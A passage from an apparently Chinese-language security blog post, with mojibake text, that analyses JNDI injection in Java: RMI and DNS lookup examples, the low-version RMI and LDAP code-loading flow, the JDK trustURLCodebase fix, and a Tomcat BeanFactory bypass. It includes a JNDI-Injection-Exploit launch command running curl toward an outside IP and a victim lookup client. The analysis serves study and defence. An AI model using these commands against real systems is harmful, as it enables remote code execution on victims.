<span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);</span><br><span class="line"></span><br><span class="line">env.put(Context.PROVIDER_URL, <span class="string">&quot;rmi://127.0.0.1:8989&quot;</span>);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">//åˆå§‹ä¸Šä¸‹æ–‡ï¼Œå…¶å®é€šä¿—ç‚¹æ¥è®²å°±æ˜¯è·å–åˆå§‹ç›®å½•ç¯å¢ƒã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="comment">//è°ƒç”¨è¿œç¨‹ç±»</span></span><br><span class="line"></span><br><span class="line"><span class="type">Servicetest</span> <span class="variable">Servicetest</span> <span class="operator">=</span>(Servicetest)initialContext.lookup(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">re</span> <span class="operator">=</span> Servicetest.test();</span><br><span class="line"></span><br><span class="line">System.out.println(re);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="JNDI-DNS"><a href="#JNDI-DNS" class="headerlink" title="JNDI+DNS"></a>JNDI+DNS</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DNSClient</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">Hashtable&lt;String, String&gt; env = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">&quot;com.sun.jndi.dns.DnsContextFactory&quot;</span>);</span><br><span class="line"></span><br><span class="line">env.put(Context.PROVIDER_URL, <span class="string">&quot;dns://114.114.114.114&quot;</span>);</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">DirContext</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialDirContext</span>(env);</span><br><span class="line"></span><br><span class="line"><span class="type">Attributes</span> <span class="variable">res</span> <span class="operator">=</span> ctx.getAttributes(<span class="string">&quot;quan9i.top&quot;</span>, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;A&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">System.out.println(res);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line"></span><br><span class="line">e.printStackTrace();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‚è€ƒ:<br><a href="https://goodapple.top/archives/696">https://goodapple.top/archives/696</a><br><a href="https://xz.aliyun.com/t/13421">https://xz.aliyun.com/t/13421</a><br><a href="https://xz.aliyun.com/t/12277">https://xz.aliyun.com/t/12277</a><br><a href="https://eastjun.top/posts/jndi_inject/">https://eastjun.top/posts/jndi_inject&#x2F;</a><br><a href="https://tttang.com/archive/1611/#toc_">https://tttang.com/archive/1611/#toc_</a><br>[<a href="https://xz.aliyun.com/t/7079?time__1311=n4+xnD0Dy7itGQNKGNnmAzti=DkW3DB7in1oD%5D">https://xz.aliyun.com/t/7079?time__1311=n4%2BxnD0Dy7itGQNKGNnmAzti%3DDkW3DB7in1oD]</a>(<a href="https://xz.aliyun.com/t/7079?time__1311=n4+xnD0Dy7itGQNKGNnmAzti=DkW3DB7in1oD">https://xz.aliyun.com/t/7079?time__1311=n4%2BxnD0Dy7itGQNKGNnmAzti%3DDkW3DB7in1oD</a><br><a href="https://xz.aliyun.com/t/7264?time__1311=n4+xnD0Dy7G=BxGqGNnmADR7DgDfErrx3+BbD#toc-0">https://xz.aliyun.com/t/7264?time__1311&#x3D;n4%2BxnD0Dy7G%3DBxGqGNnmADR7DgDfErrx3%2BBbD#toc-0</a></p><h2 id="JNDIåŠ RMIæ³¨å…¥ä½ç‰ˆæœ¬æ‰§è¡Œæµç¨‹"><a href="#JNDIåŠ RMIæ³¨å…¥ä½ç‰ˆæœ¬æ‰§è¡Œæµç¨‹" class="headerlink" title="JNDIåŠ RMIæ³¨å…¥ä½ç‰ˆæœ¬æ‰§è¡Œæµç¨‹"></a>JNDIåŠ RMIæ³¨å…¥ä½ç‰ˆæœ¬æ‰§è¡Œæµç¨‹</h2><p>è¿™é‡Œé€‰æ‹©ä½¿ç”¨åˆ«äººå†™å¥½çš„å·¥å…·å¯ç”¨ä¸€ä¸ªæœåŠ¡ç«¯ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©è‡ªå·±ç®€å•å†™ä¸€ä¸ªï¼Œæˆ‘è¿™é‡Œä¸ºäº†æ–¹ä¾¿å°±ä½¿ç”¨åˆ«äººçš„å·¥å…·</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar</span><br><span class="line">å¯åŠ¨å‘½ä»¤</span><br><span class="line">java -jar JNDI-Injection-Exploit-<span class="number">1.0</span>-SNAPSHOT-all.jar -C curl <span class="number">47.101</span><span class="number">.63</span><span class="number">.120</span>:<span class="number">8081</span></span><br></pre></td></tr></table></figure><p>è¢«æ”»å‡»çš„å®¢æˆ·ç«¯ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDNIAttack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.lookup(<span class="string">&quot;rmi://10.169.5.226:1099/wnys6l&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼€å§‹è¿›è¡Œåˆ†æ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732288977241-fddf5695-7d1b-46f9-a1a7-cbc6102983db.png"></p><p>ç»§ç»­è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732288995665-71ace546-b339-4f08-a711-fa264ac3140c.png"></p><p>ç»§ç»­è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732289007284-12f2a2f3-c3b4-4ecc-88ce-884e95111229.png"></p><p>åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰ä¸ªç†Ÿæ‚‰çš„registry.lookupï¼Œå…¶å®è¿™é‡Œçš„registryçš„å€¼å°±æ˜¯<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732289055879-27faadb1-77aa-4b6d-8a41-b7b915f2cc25.png"></p><p>æ‰€ä»¥è¿™é‡Œé¢æ˜¯å­˜åœ¨ç€rmiååºåˆ—åŒ–æ¼æ´çš„ã€‚è¿™é‡Œå…ˆä¸ç®¡è¿™ä¸ªç»§ç»­è·Ÿåˆ°ä¸‹é¢decodeObjectæ–¹æ³•é‡Œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732289150799-9c2fb85c-dd52-4d36-8651-6f57372f265d.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732289178902-3b1cfb3a-8e91-449e-8204-67036c5b41a7.png"></p><p>è¿™é‡Œç®­å¤´æ‰€æŒ‡çš„ä½œç”¨å°±æ˜¯å°†ReferenceWrapperè¿˜åŸæˆreferenceï¼Œç»§ç»­è·Ÿåˆ°NamingManager.getObjectInstanceæ–¹æ³•é‡Œå»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732289299965-e264b2da-b36e-43cd-b740-5f48fa9f4806.png"></p><p>è·Ÿè¿›ç®­å¤´æ‰€æŒ‡çš„åœ°æ–¹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732289356766-9ac41169-776f-4a28-a136-52faac5444cf.png"></p><p>è¿™é‡Œä¼šè¿›è¡Œç±»åŠ è½½ï¼Œè·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732289510521-53ff09db-275c-4f7b-93d3-8acdf16adbf9.png"> è¿™é‡Œä¼šå…ˆä»æœ¬åœ°åŠ è½½æˆ‘ä»¬ç©¿è¿›å»çš„ç±»ï¼Œä½†æ˜¯è‚¯å®šæ˜¯ä¸å­˜åœ¨çš„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732290309773-981648e4-f3e1-4312-a5a3-a6a8843d94cf.png"></p><p>ä¹‹åå°±ä¼šå»è¿™é‡Œé€šè¿‡codebase æ‰¾ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„è¿œç¨‹åœ°å€ï¼Œç„¶åè¿›è¡ŒåŠ è½½</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732290373830-85cc86ae-96cd-4cb5-9379-c0902fede4fa.png"></p><p>è¿™é‡Œå¦‚æœæ˜¯é™æ€ä»£ç å—å°±ä¼šç›´æ¥åŠ è½½æ‰§è¡Œäº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732290459987-5857aad8-73b7-4d1d-868a-2425e71b3566.png"></p><p>å¦‚æœæ˜¯æ„é€ å‡½æ•°å°±ä¼šæ˜¯å®ä¾‹åŒ–</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732290545958-2c8c1696-cf32-4b7b-b59b-29eea36de030.png"></p><h3 id="JDNIä½ç‰ˆæœ¬ä¿®å¤"><a href="#JDNIä½ç‰ˆæœ¬ä¿®å¤" class="headerlink" title="JDNIä½ç‰ˆæœ¬ä¿®å¤"></a>JDNIä½ç‰ˆæœ¬ä¿®å¤</h3><p>å¯¹æ¯”ä¸‹æ–°æ—§ç‰ˆJDKçš„com.sun.jndi.rmi.registry.RegistryContextç±»çš„decodeObject()å‡½æ•°çš„ä»£ç å°±å¾ˆæ¸…æ¥šäº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½ç‰ˆæœ¬JDK</span></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="built_in">this</span>, <span class="built_in">this</span>.environment);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            <span class="type">NamingException</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// é«˜ç‰ˆæœ¬JDK</span></span><br><span class="line">    <span class="keyword">private</span> Object <span class="title function_">decodeObject</span><span class="params">(Remote var1, Name var2)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var3</span> <span class="operator">=</span> var1 <span class="keyword">instanceof</span> RemoteReference ? ((RemoteReference)var1).getReference() : var1;</span><br><span class="line">            <span class="type">Reference</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Reference) &#123;</span><br><span class="line">                var8 = (Reference)var3;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var3 <span class="keyword">instanceof</span> Referenceable) &#123;</span><br><span class="line">                var8 = ((Referenceable)((Referenceable)var3)).getReference();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var8 != <span class="literal">null</span> &amp;&amp; var8.getFactoryClassLocation() != <span class="literal">null</span> &amp;&amp; !trustURLCodebase) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;The object factory is untrusted. Set the system property &#x27;com.sun.jndi.rmi.object.trustURLCodebase&#x27; to &#x27;true&#x27;.&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> NamingManager.getObjectInstance(var3, var2, <span class="built_in">this</span>, <span class="built_in">this</span>.environment);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (NamingException)wrapRemoteException(var6).fillInStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            <span class="type">NamingException</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>();</span><br><span class="line">            var4.setRootCause(var7);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾ï¼Œå°±åªæ˜¯åœ¨ä½¿ç”¨URLClassLoaderåŠ è½½å™¨åŠ è½½è¿œç¨‹ç±»ä¹‹å‰åŠ äº†ä¸ªifè¯­å¥æ£€æµ‹com.sun.jndi.ldap.object.trustURLCodebaseçš„å€¼æ˜¯å¦ä¸ºtrueï¼Œè€Œè¯¥è®¾ç½®é¡¹çš„å€¼é»˜è®¤ä¸ºfalseã€‚</p><h2 id="JNDIåŠ LDAPä½ç‰ˆæœ¬æ³¨å…¥æ‰§è¡Œæµç¨‹"><a href="#JNDIåŠ LDAPä½ç‰ˆæœ¬æ³¨å…¥æ‰§è¡Œæµç¨‹" class="headerlink" title="JNDIåŠ LDAPä½ç‰ˆæœ¬æ³¨å…¥æ‰§è¡Œæµç¨‹"></a>JNDIåŠ LDAPä½ç‰ˆæœ¬æ³¨å…¥æ‰§è¡Œæµç¨‹</h2><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732335913754-c2a241e5-38a7-44a6-9d2e-1877b814e32b.png"></p><p>è¿™é‡Œä¸»è¦æ˜¯è·Ÿå‰é¢çš„åè®®ä¸åŒè°ƒç”¨ä¸åŒçš„lookupï¼Œç»§ç»­è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732335965221-01d93508-c9b5-4c7b-bc9a-7a0a1ffffa1a.png"></p><p>ç»§ç»­è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336071774-485c1b9b-a7fd-4275-a2ce-ac2014359102.png"></p><p>ç»§ç»­è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336108528-ca7357f1-5a89-4ae5-a314-a75120d56cee.png"></p><p>æ¥ç€è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336144415-f6e379cf-4c62-4892-9931-b55ffaafc137.png"></p><p>é‡ç‚¹åœ¨decodeObjectè¿™é‡Œï¼Œè¿™é‡Œçš„attrså°±æ˜¯ldapä¸Šçš„å±æ€§</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336198575-d4c3b2aa-d7c0-49d2-b184-867e6ef1f5e4.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336329918-c3999510-3636-4c16-9536-195c4600a009.png"></p><p>ç»§ç»­è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336377793-f3293112-8156-4f66-9e1a-5fa6b37ea437.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336776593-e3a00c5d-8f17-42ec-856c-c160975c64d7.png"></p><p>è¿™é‡Œå°±æ˜¯è·å–ä¸€äº›å€¼è§£æè¿™äº›å±æ€§ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰è®¸å¤šåˆ¤æ–­æ¡ä»¶ï¼Œæ˜¯å› ä¸ºjndiæ”¯æŒè®¸å¤šç±»å‹ä¿å­˜</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336475205-e28c2394-a9e5-47d6-bf71-ecc73fdccc46.png"></p><p>å¯ä»¥çœ‹åˆ°å¦‚æœæ˜¯åºåˆ—åŒ–çš„è¯å°±ä¼šè°ƒç”¨ååºåˆ—åŒ–ï¼Œå¦‚æœæ˜¯å¼•ç”¨çš„è¯å°±è°ƒç”¨</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336618693-c36fab70-47fe-411d-8429-d8cbcf85aa81.png"></p><p>å°±ä¼šå°†æˆ‘ä»¬çš„å¼•ç”¨ç»™è§£æå‡ºæ¥ï¼Œè·Ÿrmiçš„ç±»ä¼¼ï¼Œè§£å‡ºæ¥ä¹‹å</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336890350-01406172-185a-4551-a085-785b7bebe41f.png"></p><p>å›åˆ°è¿™é‡Œç»§ç»­è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732336963349-f79759cd-e716-4148-b9c7-841a50ed480b.png"></p><p>å’Œrmiå°±åŸºæœ¬ä¸€æ ·äº†åˆ°è¿™é‡Œã€‚</p><h3 id="LDAPä½ç‰ˆæœ¬ä¿®å¤"><a href="#LDAPä½ç‰ˆæœ¬ä¿®å¤" class="headerlink" title="LDAPä½ç‰ˆæœ¬ä¿®å¤"></a>LDAPä½ç‰ˆæœ¬ä¿®å¤</h3><p>æ¯”è¾ƒä¸‹æ–°æ—§ç‰ˆæœ¬çš„com.sun.naming.internal.VersionHelper12ç±»loadClass()å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ—§ç‰ˆæœ¬JDK</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className A non-null fully qualified class name.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> codebase A non-null, space-separated list of URL strings.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">            <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> getContextClassLoader();</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span></span><br><span class="line">                 URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ–°ç‰ˆæœ¬JDK</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className A non-null fully qualified class name.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> codebase A non-null, space-separated list of URL strings.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String className, String codebase)</span><br><span class="line">            <span class="keyword">throws</span> ClassNotFoundException, MalformedURLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;true&quot;</span>.equalsIgnoreCase(trustURLCodebase)) &#123;</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">parent</span> <span class="operator">=</span> getContextClassLoader();</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span></span><br><span class="line">                    URLClassLoader.newInstance(getUrlArray(codebase), parent);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> loadClass(className, cl);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> å¾ˆæ˜æ˜¾ï¼Œå°±åªæ˜¯åœ¨ä½¿ç”¨URLClassLoaderåŠ è½½å™¨åŠ è½½è¿œç¨‹ç±»ä¹‹å‰åŠ äº†ä¸ªifè¯­å¥æ£€æµ‹com.sun.jndi.ldap.object.trustURLCodebaseçš„å€¼æ˜¯å¦ä¸ºtrueï¼Œè€Œè¯¥è®¾ç½®é¡¹çš„å€¼é»˜è®¤ä¸ºfalseã€‚</p><h2 id="JNDIé«˜ç‰ˆæœ¬ç»•è¿‡"><a href="#JNDIé«˜ç‰ˆæœ¬ç»•è¿‡" class="headerlink" title="JNDIé«˜ç‰ˆæœ¬ç»•è¿‡"></a>JNDIé«˜ç‰ˆæœ¬ç»•è¿‡</h2><p>è¿™é‡Œå•°å—¦è¯´å¾ˆå¤šï¼Œå°±ç›´æ¥æ€»ç»“ç½‘ä¸Šå¸ˆå‚…ä»¬æ‰€è¯´çš„ï¼Œå…¶å®å°±æ˜¯èƒ½å¤Ÿåœ¨æœ¬åœ°æ‰¾åˆ°ä¸€ä¸ªå·¥å‚ç±»å¹¶ä¸”å®ç°äº†ObjectFactoryæ¥å£ï¼Œå¹¶ä¸”å­˜åœ¨getObjectInstanceæ–¹æ³•ï¼Œå°±å¯ä»¥è¿›è¡Œå°è¯•æ¢ç´¢åˆ©ç”¨ã€‚è€Œè¿™é‡Œæ¯”è¾ƒå¸¸ç”¨çš„ä¸€ä¸ªæ˜¯tomcatçš„<code>org.apache.naming.factory.BeanFactory</code> å·¥å‚ç±»å»è°ƒç”¨ <code>javax.el.ELProcessor#eval</code>æ–¹æ³•ã€‚è¿™é‡Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ä»–çš„æ‰§è¡Œè¿‡ç¨‹ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥æ¥åˆ°è¿™ä¸€æ­¥</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732953708726-827aaef6-5537-4b46-9296-cefba6f8d217.png"></p><p>è·Ÿè¿›å»ä¼šå‘ç°æ˜¯é€šè¿‡loadClass()å‡½æ•°æ¥åŠ è½½æˆ‘ä»¬ä¼ å…¥çš„org.apache.naming.factory.BeanFactoryç±»ï¼Œç„¶åæ–°å»ºè¯¥ç±»å®ä¾‹å¹¶å°†å…¶è½¬æ¢æˆObjectFactoryç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>æˆ‘ä»¬ä¼ å…¥çš„Factoryç±»å¿…é¡»å®ç°ObjectFactoryæ¥å£ç±»ã€è€Œorg.apache.naming.factory.BeanFactoryæ­£å¥½æ»¡è¶³è¿™ä¸€ç‚¹</strong>ï¼š</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732953748083-947e8a07-dc23-4465-9a99-db9d83363e09.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732959225871-1d7ab388-0c6a-4fd9-834b-c70baf0ab612.png"></p><p>è¿™é‡Œå¯ä»¥çŸ¥é“å°±æ˜¯é¦–å…ˆä¼šåŠ è½½æœ¬åœ°çš„å·¥å‚ç±»ï¼Œå¦‚æœä¸å­˜åœ¨åœ¨å»è¿œç¨‹åŠ è½½æˆ‘ä»¬æŒ‡å®šçš„ç±»ã€‚è¿™é‡Œæˆ‘ä»¬çŸ¥é“å¦‚æœæœ¬åœ°å­˜åœ¨<code>che.naming.factory.BeanFactory</code> å·¥å‚ç±»ä»–æ˜¯èƒ½åŠ è½½æˆåŠŸçš„ã€‚æ‰€ä»¥æˆ‘ä»¬ç»§ç»­è·Ÿè¿›<img 